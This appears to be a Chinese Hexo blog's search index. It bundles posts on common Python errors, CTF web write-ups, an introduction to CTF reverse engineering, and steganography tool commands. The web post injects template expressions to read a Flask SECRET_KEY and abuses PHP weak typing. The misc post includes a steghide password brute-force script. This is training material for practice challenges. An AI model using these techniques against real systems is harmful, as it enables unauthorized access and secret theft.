<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python程序运行常见错误总结</title>
    <url>/2022/01/02/Python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Python程序运行常见错误总结</p>
<span id="more"></span>

<h2 id="1-SyntaxError-invalid-syntax"><a href="#1-SyntaxError-invalid-syntax" class="headerlink" title="1.SyntaxError:invalid syntax"></a>1.SyntaxError:invalid syntax</h2><p>语法错误：非法的语法。这种错误很常见，根据系统提示好好检查代码即可，看报错信息在第几行，从这一行往上找错误。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> i=<span class="number">3</span>:	</span><br><span class="line"></span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure>

<h2 id="2-NameError-name-‘q’-is-not-defined"><a href="#2-NameError-name-‘q’-is-not-defined" class="headerlink" title="2.NameError: name ‘q’ is not defined"></a>2.NameError: name ‘q’ is not defined</h2><p>变量名错误：’q’未定义。解决方法是在前面给q赋值，还有一种可能是变量或者函数名拼写错误。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  q</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;q&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<h2 id="3-Indentation-Error"><a href="#3-Indentation-Error" class="headerlink" title="3.Indentation Error"></a>3.Indentation Error</h2><p>缩进错误：Python的缩进非常严格，行首多个空格，少个空格都会报错。 像def，class，if，for，while等代码块都需要缩进。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">j=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i&lt;j:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">IndentationError: expected an indented block</span><br></pre></td></tr></table></figure>

<h2 id="4-IndexError-string-index-out-of-range"><a href="#4-IndexError-string-index-out-of-range" class="headerlink" title="4.IndexError: string index out of range"></a>4.IndexError: string index out of range</h2><p>索引错误：字符串超出了范围。解决办法：查看字符串的长度，索引要小于长度。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#8&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  s[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">IndexError: string index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure>

<h2 id="5-ValueError-substring-not-found"><a href="#5-ValueError-substring-not-found" class="headerlink" title="5.ValueError: substring not found"></a>5.ValueError: substring not found</h2><p>值错误：子字符串未找到。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2=<span class="string">&#x27;ei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1.index(s2)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#11&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  s1.index(s2)</span><br><span class="line"></span><br><span class="line">ValueError: substring <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<h2 id="6-IndexError-list-index-out-of-range"><a href="#6-IndexError-list-index-out-of-range" class="headerlink" title="6.IndexError: list index out of range"></a>6.IndexError: list index out of range</h2><p>索引错误：列表索引超出范围。解决办法：查看列表的长度，索引要小于长度。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#5&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  L[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure>

<h2 id="7-AttributeError-‘tuple’-object-has-no-attribute-‘remove’"><a href="#7-AttributeError-‘tuple’-object-has-no-attribute-‘remove’" class="headerlink" title="7.AttributeError: ‘tuple’ object has no attribute ‘remove’"></a>7.AttributeError: ‘tuple’ object has no attribute ‘remove’</h2><p>属性错误：元组对象没有属性’remove’。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t=(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.remove(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#13&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  t.remove(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AttributeError: <span class="string">&#x27;tuple&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;remove&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="8-KeyError-‘ff’"><a href="#8-KeyError-‘ff’" class="headerlink" title="8.KeyError: ‘ff’"></a>8.KeyError: ‘ff’</h2><p>key 键错误：没有指定的键值“ff”</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">\&gt;&gt;&gt; <span class="built_in">dict</span>[<span class="string">&#x27;ff&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#3&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">dict</span>[<span class="string">&#x27;ff&#x27;</span>]</span><br><span class="line"></span><br><span class="line">KeyError: <span class="string">&#x27;ff&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-TypeError-pop-expected-at-least-1-arguments-got-0"><a href="#9-TypeError-pop-expected-at-least-1-arguments-got-0" class="headerlink" title="9.TypeError: pop expected at least 1 arguments, got 0"></a>9.TypeError: pop expected at least 1 arguments, got 0</h2><p>类型错误：pop方法希望得到至少一个参数，但是现在参数为0。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.pop()</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#7&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">dict</span>.pop()</span><br><span class="line"></span><br><span class="line">TypeError: pop expected at least <span class="number">1</span> arguments, got <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="10-TypeError-Can’t-convert-‘int’-object-to-str-implicitl"><a href="#10-TypeError-Can’t-convert-‘int’-object-to-str-implicitl" class="headerlink" title="10.TypeError: Can’t convert ‘int’ object to str implicitl"></a>10.TypeError: Can’t convert ‘int’ object to str implicitl</h2><p>类型错误：不能转换整形成字符串。解决办法：使用+拼接时必须使用字符串，或将数字转化成字符串str()</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;hello&#x27;</span>+<span class="number">9</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;hello&#x27;</span>+<span class="number">9</span></span><br><span class="line"></span><br><span class="line">TypeError: Can<span class="string">&#x27;t convert &#x27;</span><span class="built_in">int</span><span class="string">&#x27; object to str implicitly</span></span><br></pre></td></tr></table></figure>

<h2 id="11-SyntaxError-EOL-while-scanning-string-literal"><a href="#11-SyntaxError-EOL-while-scanning-string-literal" class="headerlink" title="11. SyntaxError: EOL while scanning string literal"></a>11. SyntaxError: EOL while scanning string literal</h2><p>语法错误：在字符串首尾忘记加引号。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;hello)    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SyntaxError: EOL while scanning string literal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12. TypeError: &#x27;</span><span class="built_in">range</span><span class="string">&#x27; object does not support item assignment</span></span><br></pre></td></tr></table></figure>

<p>类型错误：range不支持item操作。range() 返回的是“range object”，而不是实际的 list 值。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l=<span class="built_in">range</span>(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">3</span>]=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#8&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  l[<span class="number">3</span>]=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">TypeError: <span class="string">&#x27;range&#x27;</span> <span class="built_in">object</span> does <span class="keyword">not</span> support item assignment</span><br><span class="line"></span><br><span class="line">可改为：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">3</span>]=<span class="number">16</span></span><br></pre></td></tr></table></figure>

<h2 id="13-IndentationError-unindent-does-not-match-any-outer-indentation-level"><a href="#13-IndentationError-unindent-does-not-match-any-outer-indentation-level" class="headerlink" title="13. IndentationError:unindent does not match any outer indentation level"></a>13. IndentationError:unindent does not match any outer indentation level</h2><p>缩进错误：未知缩进不匹配任何缩进等级。缩进混乱造成。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​	j=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">​    k=<span class="number">3</span>    </span><br><span class="line"></span><br><span class="line">SyntaxError: unindent does <span class="keyword">not</span> match <span class="built_in">any</span> outer indentation level</span><br></pre></td></tr></table></figure>

<h2 id="14-FileNotFoundError-Errno-2-No-such-file-or-directory-‘file1’"><a href="#14-FileNotFoundError-Errno-2-No-such-file-or-directory-‘file1’" class="headerlink" title="14. FileNotFoundError: [Errno 2] No such file or directory: ‘file1’"></a>14. FileNotFoundError: [Errno 2] No such file or directory: ‘file1’</h2><p>文件不存在：尝试打开一个不存在的磁盘文件或目录。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=<span class="built_in">open</span>(<span class="string">&#x27;file1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#15&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  f=<span class="built_in">open</span>(<span class="string">&#x27;file1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;file1&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python类</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Web刷题</title>
    <url>/2022/01/11/Web%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<p>Web经典题型及其相关解题步骤</p>
<span id="more"></span>

<h1 id="Get和Post"><a href="#Get和Post" class="headerlink" title="Get和Post"></a>Get和Post</h1><p>在web中最简单且最重要的就是get和post的相关方法，对于Get的方法如下：</p>
<p>借用Bugctf平台中的题</p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/1.png" alt=" "></p>
<p>Get就是直接在网址上面直接加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/？***</span><br></pre></td></tr></table></figure>

<p>具体根据对应题来写。</p>
<p>对于Post的方法如下：</p>
<p>Post需要借助相关插件hackber来进行，这在各浏览器都可以下载，推荐使用火狐浏览器</p>
<p>这个的借用题和上面的Get几乎一样，这里就不放图了，上重点，用hackber<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/3.png" alt=" "></p>
<p>然后根据题意<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/4.png" alt=" "></p>
<p>就可以顺利得到flag<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/2.png" alt=" "></p>
<h1 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210528104247407.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>这个题目是<code>SSTI</code>（<code>Server-Side Template Injection</code>）服务器端模板注入</p>
</li>
<li><p>查看源代码，下方提示的是<code>flask</code>和<code>secret_key</code><br><code>flask</code>是<code>python</code>的一个<code>web</code>框架</p>
</li>
<li><p>相关资料参考一下链接</p>
</li>
</ul>
<p>拿到题先看源代码<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>要我们传入一个flag参数，用post直接报错，那么就选择采用get方式，看源代码发现在<a href="https://so.csdn.net/so/search?q=flask">flask</a>里，经常设置一个secret_key变量。</p>
<blockquote>
<p>传入一个<code>flag</code>参数，用两个括号括起来一个表达式或者是变量，返回对应的表达式或变量的值。</p>
</blockquote>
<p>尝试后发现成功回显，则输入config查看变量内容<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210707190048792.png" alt="在这里插入图片描述"></p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/5.png" alt=" "></p>
<p>在这里找到了flag！</p>
<p>其次，因为题目提示<code>flag</code>值是在<code>SECRET_KEY</code>中，也可以修改成<code>config.SECRET_KEY</code>来访问变量的值<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70-16418967980484.png" alt="在这里插入图片描述"></p>
<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE.png" alt=" "></p>
<blockquote>
<p>这是php弱类型，题的意思就是如果num不能是数字就输出num，如果num=1就输出flag{}，看似矛盾其实不矛盾，只需要/？flag=1*就可以，就是让1后面有其他字符，这样两个式子都成立，就可以得到flag。</p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE%E7%AD%94%E6%A1%88.png" alt=" "></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之reverse</title>
    <url>/2022/01/01/ctf%E4%B9%8Breverse/</url>
    <content><![CDATA[<p>CTF中的Reverse领域的入门学习</p>
<span id="more"></span>

<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>​     不说题外话，经过一学期的学习和参加一次CTF大赛后，对于reverse的最直观的印象就是写脚本，写各种程序，不论是很简单的reverse题还是较为复杂的，甚至有时候思路很明确，写出来脚本之后flag就到手了。</p>
<p>​      总而言之，对于reverse，如果想学精学透，最基础的应该就是从脚本下手，多刷题，多写脚本，而对于解题方便，脚本语言习惯上使用python，所以学好python，非常重要，不仅仅是python，多掌握一门语言没有坏处，学习C语言也是必不可少的。</p>
<h1 id="逆向的核心"><a href="#逆向的核心" class="headerlink" title="逆向的核心"></a>逆向的核心</h1><p>​      学习逆向不仅仅要学好语言，最重要的核心是破解验证算法，要学好算法！</p>
<h2 id="验证算法如下"><a href="#验证算法如下" class="headerlink" title="验证算法如下"></a>验证算法如下</h2><p>   输入：key</p>
<p>   验证：if H(key)==Secret</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    flag=O(key);</span><br><span class="line">    print flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>   输出：flag</p>
<h2 id="验证算法分类"><a href="#验证算法分类" class="headerlink" title="验证算法分类"></a>验证算法分类</h2><p>1.简单比较验证</p>
<p>2.密码算法验证</p>
<p>3.算法求解验证</p>
<h2 id="算法举例如下："><a href="#算法举例如下：" class="headerlink" title="算法举例如下："></a>算法举例如下：</h2><h3 id="1-key直接比较"><a href="#1-key直接比较" class="headerlink" title="1.key直接比较"></a>1.key直接比较</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strncmp</span>(szKey,<span class="string">&quot;Thi5_i5_TOo_E4sy&quot;</span>,<span class="number">16</span>)==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;flag is your key!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please decompiler or debug me!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这种类型flag就在其中，善于观察即可！</p>
<h3 id="2-key简单变换"><a href="#2-key简单变换" class="headerlink" title="2.key简单变换"></a>2.key简单变换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;\x58\x31\x70\x5C\x35\x76\x59\x69\x38\x7D\x55\x63\x38\x7F\x6A&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szXor[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;strien(szKey);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szXor[i]=szKey[i]^i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szXor,secret,<span class="keyword">sizeof</span>(secret))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个用异或，再进行一次就出来了，见识短浅的我表示还再学习学习才能明白。</p>
<h3 id="3-key编码转换"><a href="#3-key编码转换" class="headerlink" title="3.key编码转换"></a>3.key编码转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;QjRzZTYOX2k1X2MwbW1vbg==&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szBase64[<span class="number">40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szkey);</span><br><span class="line">	Base64encode(szBase64,szKey,<span class="built_in">strlen</span>(szkey));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szBase64,secret,<span class="keyword">sizeof</span>(serect))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种转换常见为Base64，也不排除会出现其他编码！</p>
<h3 id="4-key散列计算"><a href="#4-key散列计算" class="headerlink" title="4.key散列计算"></a>4.key散列计算</h3><p>这种类型的，可以用md5进行反查</p>
<h2 id="验证算法逆向思路"><a href="#验证算法逆向思路" class="headerlink" title="验证算法逆向思路"></a>验证算法逆向思路</h2><h3 id="简单变化验证"><a href="#简单变化验证" class="headerlink" title="简单变化验证"></a>简单变化验证</h3><p>—-人工逆向，找到可逆运算，按位分步破解</p>
<h3 id="密码算法验证"><a href="#密码算法验证" class="headerlink" title="密码算法验证"></a>密码算法验证</h3><p>—-识别密码算法，针对性解密</p>
<h3 id="解题算法验证"><a href="#解题算法验证" class="headerlink" title="解题算法验证"></a>解题算法验证</h3><p>—-理解算法原理，针对性解题</p>
<h3 id="验证常见漏洞"><a href="#验证常见漏洞" class="headerlink" title="验证常见漏洞"></a>验证常见漏洞</h3><p>—-直接输出flag</p>
<p>—-密钥空间过短</p>
<p>—-伪随机算法</p>
<h3 id="现实竞赛"><a href="#现实竞赛" class="headerlink" title="现实竞赛"></a>现实竞赛</h3><p>—-分段，嵌套验证</p>
<h3 id="爆破奇招"><a href="#爆破奇招" class="headerlink" title="爆破奇招"></a>爆破奇招</h3><p>—-简单验证（按位破解）</p>
<p>—-密码算法（密钥部分已知）</p>
<p>—-解题算法（暴力搜索）</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>要学会用F5做签到题，害，暂时就写到这吧，先学好就是多刷题，goodbye！！！</p>
<h1 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h1><p>1.i春秋训练平台：<a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></p>
<p>2.We Chall:  <a href="http://www.wechall.net/sites.php">http://www.wechall.net/sites.php</a></p>
<p>3.很炫酷游戏化————<a href="https://microcorruption.com/login">https://microcorruption.com/login</a></p>
<p>4.<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>misc部分解题软件命令记录</title>
    <url>/2022/01/23/misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>misc部分工具解题的命令记录，方便后续使用到的时候能找到，所以记录一下。</p>
<span id="more"></span>

<h1 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h1><p>全称是F5-steganography</p>
<p>1.进入该文件夹后，需要将隐写的图片复制到文件夹里然后在空白处打开终端</p>
<p>2.java Extract图片的绝对路径是/123.jpg -p 123（这个-p后面输入的是密码，多半题目密码就是图片名，还有一定要用绝对路径）</p>
<p>3.这个时候在文件夹中找到并打开output.txt文件即可得到</p>
<h2 id="steghide工具"><a href="#steghide工具" class="headerlink" title="steghide工具"></a>steghide工具</h2><p>将post.txt文件隐藏到xxx.jpg中：<br>steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）<br>从xxx.jpg解出post.txt:<br>steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）<br>steghide也可以用来爆破密码：<br>需要shell脚本：`#bruteStegHide.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #bruteStegHide.sh</span><br><span class="line">   #!/bin/bash</span><br><span class="line"></span><br><span class="line">for line in `cat $2`;do</span><br><span class="line">steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">if [[ $? -eq 0 ]];then</span><br><span class="line">echo &#x27;password is: &#x27;$line</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>用法：<br># ./bruteStegHide.sh test.jpg passwd.txt<br>剩下的密码就出来了。</p>
<h2 id="文件分离工具（binwalk-foremost）"><a href="#文件分离工具（binwalk-foremost）" class="headerlink" title="文件分离工具（binwalk,foremost）"></a>文件分离工具（binwalk,foremost）</h2><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>binwalk -D “archive:zip” -D “image:jpg” hehe.jpg 可以直接分离文件</p>
<blockquote>
<p>也可以使用dd命令分离文件，如:<code>dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163</code></p>
</blockquote>
<h2 id="foremost的使用"><a href="#foremost的使用" class="headerlink" title="foremost的使用"></a>foremost的使用</h2><p>先用<code>foremost -h</code>检查一下是否已经安装，若安装之后会显示</p>
